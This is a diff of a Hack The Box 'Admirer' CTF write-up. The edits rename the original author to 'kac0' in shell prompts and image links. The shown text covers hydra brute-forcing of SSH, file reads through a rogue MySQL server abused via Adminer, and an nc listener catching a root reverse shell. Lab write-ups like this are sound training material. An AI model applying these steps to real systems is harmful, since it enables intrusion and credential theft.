@@ -9,6 +9,7 @@ avatar: assets/htb/admirer.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Admirer
 ---
+
 ## Overview
 
 An easy difficulty Linux machine that has an interesting take on database manipulation to obtain a local file inclusion vulnerability.  It also has an interesting new \(to me\) way to leverage sudo privileges to gain privilege escalation.  In all, this was a fun machine that taught me some interesting new tricks!
@@ -20,7 +21,7 @@ An easy difficulty Linux machine that has an interesting take on database manipu
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
-zweilos@kali:~/htb/admirer$ nmap -p- -sCV -oA admirer <YOUR_IP>
+kac0@kali:~/htb/admirer$ nmap -p- -sCV -oA admirer <YOUR_IP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-04 14:20 EDT
 Nmap scan report for <YOUR_IP>
 Host is up (0.057s latency).
@@ -45,27 +46,27 @@ Nmap done: 1 IP address (1 host up) scanned in 51.54 seconds
 Looking at the results of my nmap scan I saw that only ports 21 \(FTP\), 22 \(SSH\), and 80 \(HTTP\) were open.  
 
 ```text
-zweilos@kali:~/htb/admirer$ ftp <YOUR_IP>                                                      
+kac0@kali:~/htb/admirer$ ftp <YOUR_IP>                                                      
 Connected to <YOUR_IP>.                                                                           
 220 (vsFTPd 3.0.3)                                                                                   
-Name (<YOUR_IP>:zweilos): anonymous                                                               
+Name (<YOUR_IP>:kac0): anonymous                                                               
 530 Permission denied.                                                                               
 Login failed.
 ```
 
 I started out by trying to log into FTP, but it did not allow anonymous access.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-admirer-website.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-admirer-website.png)
 
 Next, I opened a browser to see what was being hosted over HTTP and found a website of someone who was an "Admirer of skills and visuals".  There did not seem to be anything useful on the site itself.
 
 ### robots.txt
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-robots.txt.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-robots.txt.png)
 
 Nmap pointed out that there was a `robots.txt` file, so I checked it out.  I found a potential username `waldo` and also a folder `admin-dir`.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-dirbuster.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-dirbuster.png)
 
 Navigating directly to that page gave me an access forbidden error, so I fired up Dirbuster and ran it on this directory.  This led me to a few useful sounding files: `contacts.txt` and `credentials.txt`. 
 
@@ -121,7 +122,7 @@ w0rdpr3ss01!
 Next I used `hydra` to attempt a brute-force attack against SSH to see if any of the credentials would allow me to log in.
 
 ```text
-zweilos@kali:~/htb/admirer$ hydra -L users -P passwords <YOUR_IP> ssh
+kac0@kali:~/htb/admirer$ hydra -L users -P passwords <YOUR_IP> ssh
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-04 15:40:32
@@ -136,10 +137,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-04 15:40:
 The FTP credentials seemed to also work for SSH! However, the connection was closed immediately upon logging in.  After trying various ways to bypass this and failing, I moved on to try the credentials for FTP instead.
 
 ```text
-zweilos@kali:~/htb/admirer$ ftp <YOUR_IP>
+kac0@kali:~/htb/admirer$ ftp <YOUR_IP>
 Connected to <YOUR_IP>.
 220 (vsFTPd 3.0.3)
-Name (<YOUR_IP>:zweilos): ftpuser
+Name (<YOUR_IP>:kac0): ftpuser
 331 Please specify the password.
 Password:
 230 Login successful.
@@ -157,7 +158,7 @@ Using the ftp credentials, I was able to log into the FTP server.  I found a few
 
 ### The database backup
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4.1-database.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4.1-database.png)
 
 The file `dump.sql` contained a dump of the website database. Unfortunately,  it seemed as if the only useful information was the server version information and the database name and the name of a deleted table that looked to contain website files. I thought that this information could come in handy so I made note of it.
 
@@ -165,25 +166,25 @@ The file `dump.sql` contained a dump of the website database. Unfortunately,  it
 * **Table**: items \(deleted\)
 * **Version**: MySQL dump 10.16 Distrib 10.1.41-MariaDB, for debian-linux-gnu \(x86\_64\)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4.1-database2.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4.1-database2.png)
 
 The `Employees3` table had another list of potential usernames and email addresses that I added to my lists.
 
 ### Back-end code backup
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4.2-html.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4.2-html.png)
 
 After fully checking out the database, I moved on to the file `html.tar.gz`. I decompressed the tar file with `gunzip` and found that it contained a backup of the website's back-end code, including a very interesting PHP file called `admin_tasks.php` in the `/utility-scripts/` folder. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4.5-admintasks.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4.5-admintasks.png)
 
 This file looked like a nice little backdoor that the admin had left for me called the "Admin Tasks Web Interface \(v0.01 beta\)". I was very interested in options 4 through 7, which could potentially give me very sensitive system information.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4.6-db_admin.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4.6-db_admin.png)
 
 in the same folder was `db_admin.php` which contained another set of credentials, this time for the user `waldo` who I had seen in the `robots.txt`. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4.7-indexphp.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4.7-indexphp.png)
 
 There was also another password for `waldo` in the `index.php` file.  This also referenced the `items` table that had been deleted from the database I exfiltrated.  If I could get a web shell into this table, the page would run it for me when the page loaded.
 
@@ -216,23 +217,23 @@ w0rdpr3ss01!
 
 The `credentials.txt` had most of the same information as before, but `waldo` seemed to have left his bank account password in this one.  Despite finding a couple more passwords, none of these worked for logging into SSH for any user.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-admin-tasks.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-admin-tasks.png)
 
 I navigated to `http://<YOUR_IP>/utility-scripts/admin_tasks.php` which brought me to a website for running administrative tasks on the server.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4.9-admin-tasks.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4.9-admin-tasks.png)
 
 I didn't find much useful other than the fact that the page was running in the context of the `www-data` user. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4.8-admin-tasks.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4.8-admin-tasks.png)
 
 I tried to run the disabled scripts, which gave the message:  `Insufficient privileges to perform the selected operation.`
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-adminer.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-adminer.png)
 
 After I checked back on my Dirbuster scan of the `/utility-scripts/` folder, I noticed it had found a new page `adminer.php` where I found an adminer database management portal. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-adminer.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-adminer.png)
 
 I noticed the version was 4.6.2, though the page said right next to it that there was a version 4.7.7 available to download. A search for adminer 4.6.2 exploit brought me to [https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability](https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability). This led to [https://sansec.io/research/sites-hacked-via-mysql-protocal-flaw](https://sansec.io/research/sites-hacked-via-mysql-protocal-flaw), which in turn linked to a MySQL exploit on GitHub at [https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue\_mysql\_server.py](https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py).  I also found a few other references that gave a pretty clear picture of how to exploit this particular web SQL management portal.
 
@@ -251,8 +252,8 @@ I did a bit more research to figure out exactly how to set up the MySQL database
 * [https://www.liquidweb.com/kb/grant-permissions-to-a-mysql-user-on-linux-via-command-line/](https://www.liquidweb.com/kb/grant-permissions-to-a-mysql-user-on-linux-via-command-line/)
 
 ```text
-zweilos@kali:/etc/mysql/conf.d$ service mysql start
-zweilos@kali:/etc/mysql/conf.d$ sudo su -
+kac0@kali:/etc/mysql/conf.d$ service mysql start
+kac0@kali:/etc/mysql/conf.d$ sudo su -
 root@kali:~# mysql
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
 Your MariaDB connection id is 52
@@ -299,23 +300,23 @@ logout
 After creating the database and a table called `admirer`, I created a user named `test` and gave it full permissions to manage the database.  
 
 ```text
-zweilos@kali:/etc/mysql/mariadb.conf.d$ ls
+kac0@kali:/etc/mysql/mariadb.conf.d$ ls
 50-client.cnf  50-mysql-clients.cnf  50-mysqld_safe.cnf  50-server.cnf
-zweilos@kali:/etc/mysql/mariadb.conf.d$ sudo vim 50-server.cnf
+kac0@kali:/etc/mysql/mariadb.conf.d$ sudo vim 50-server.cnf
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5.5-config-file.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5.5-config-file.png)
 
 Next I had to set the binding for the server to the address `0.0.0.0` so that the external service could connect to it by my IP.  The default is `127.0.0.1` which is localhost only.
 
 ```text
-zweilos@kali:/etc/mysql/conf.d$ service mysql stop
-zweilos@kali:/etc/mysql/conf.d$ service mysql start
+kac0@kali:/etc/mysql/conf.d$ service mysql stop
+kac0@kali:/etc/mysql/conf.d$ service mysql start
 ```
 
 After changing the server `bind-address` setting to `0.0.0.0` I had to restart the `mysql` service for it to take effect. After that I was able to login to my database in the Adminer portal.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-adminer-login%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-adminer-login%2520%25281%2529.png)
 
 ### Finding user creds
 
@@ -329,20 +330,20 @@ INTO TABLE admirer.test
 FIELDS TERMINATED BY "\n"
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-failed-local-inclusion%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-failed-local-inclusion%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25282%2529%2520%25281%2529.png)
 
 To test for the local file inclusion vulnerability I first tried to get `/etc/passwd` but was denied access to that file. Since I was fairly sure that this portal was still only running in the context of `www-data` I decided to try to get a file I knew I could access: `index.php`.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-local-inclusion-success.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-local-inclusion-success.png)
 
 I wasn't even sure that this was going to work, but to my surprise it retrieved the file and added it to my database. I now had a way to read through the source code of the production website as opposed to the backups I downloaded earlier.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-yet-another-password.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-yet-another-password.png)
 
 Much to my surprise...there was yet again another password contained in this file. Before trying to download any more files I decided to try to brute force SSH login again with this new password.
 
 ```text
-zweilos@kali:~/htb/admirer$ hydra -L users -P passwords <YOUR_IP> ssh
+kac0@kali:~/htb/admirer$ hydra -L users -P passwords <YOUR_IP> ssh
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-04 22:49:46
@@ -360,7 +361,7 @@ I had finally found a usable password for `waldo`!  I hoped that it wouldn't jus
 ### User.txt
 
 ```text
-zweilos@kali:~/htb/admirer$ ssh waldo@<YOUR_IP>
+kac0@kali:~/htb/admirer$ ssh waldo@<YOUR_IP>
 waldo@<YOUR_IP>'s password: 
 Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux
 
@@ -376,7 +377,7 @@ Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3
 waldo@admirer:~$ ls
 user.txt
 waldo@admirer:~$ cat user.txt
-e9d4****af9a
+e9d4************************af9a
 ```
 
 Luckily it logged me right in, and I was able to collect my hard-earned loot!
@@ -731,11 +732,11 @@ waldo@admirer:/dev/shm$ I am groot
 ### Root.txt
 
 ```text
-zweilos@kali:~$ nc -lvnp 12345
+kac0@kali:~$ nc -lvnp 12345
 listening on [any] 12345 ...
 connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 60956
 whoami
 root
 cat /root/root.txt
-0f4b****b877
+0f4b************************b877
 ```
